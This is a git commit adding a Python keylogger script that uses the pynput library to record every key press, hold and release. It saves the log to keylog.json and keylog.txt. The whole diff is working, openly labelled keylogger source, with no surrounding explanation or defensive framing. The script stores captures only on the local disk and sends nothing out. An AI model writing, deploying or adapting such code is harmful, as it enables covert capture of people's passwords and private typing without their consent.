6bcbf9f69aa4bc4c3614939fd8761743d8a8c950
Gyanamkumar <95013143+Gyanamkumar@users.noreply.github.com>
2025-11-29 11:25:20 +0530

    Add keylogger functionality with JSON and text file logging

---
+++ Keylogger_Folder/keylogger.py
@@ -0,0 +1,39 @@
+from pynput import keyboard
+import json
+
+keylist= []
+x = False
+key_strokes = ""
+
+def update_text_file(key):
+    with open("keylog.txt", "w+") as key_stroke:
+        key_stroke.write(key)
+
+def update_json_file(keylist):
+    with open("keylog.json", "wb") as key_log:
+        key_list_bytes = json.dumps(keylist).encode()
+        key_log.write(key_list_bytes)
+
+def on_press(key):
+    global x , keylist
+    if x == False:
+        keylist.append({'pressed' : f'{key}'})
+        x=True
+    if x == True:
+        keylist.append({'Held' : f'{key}'})
+    update_json_file(keylist)
+
+def on_release(key):
+    global x , keylist , key_strokes 
+    keylist.append({'Released' : f'{key}'})
+    if x == True:
+        x = False
+    update_json_file(keylist)
+
+    key_strokes= key_strokes+str(key)
+    update_text_file(str(key_strokes))
+
+
+print(" [+] Running keylogger Successfully \n [!] Saving the keylogs in keylog.json and keylog.txt")
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
